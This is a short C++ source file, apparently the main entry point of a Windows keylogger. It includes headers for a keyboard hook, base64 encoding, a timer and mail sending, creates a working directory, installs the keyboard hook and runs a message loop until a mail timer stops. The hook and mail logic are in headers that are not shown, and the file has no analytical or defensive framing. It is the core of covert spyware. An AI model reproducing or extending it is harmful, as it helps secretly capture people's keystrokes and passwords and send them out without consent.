#include<iostream>
#include<windows.h>
#include "keyconstant.h"
#include "helper.h"
#include "base64.h"
#include "io.h"
#include "timer.h"
#include "sendmail.h"
#include "keybhook.h"

using namespace std ;


int main()
{
   MSG Msg ;

   IO::MKDir(IO::GetOurPath(true)) ;

   InstallHook() ;
   while(GetMessage(&Msg ,NULL  , 0 , 0 ))
   {
       TranslateMessage(&Msg) ;
       DispatchMessage(&Msg) ;

   }
   MailTimer.Stop() ;
      return  0 ;



}
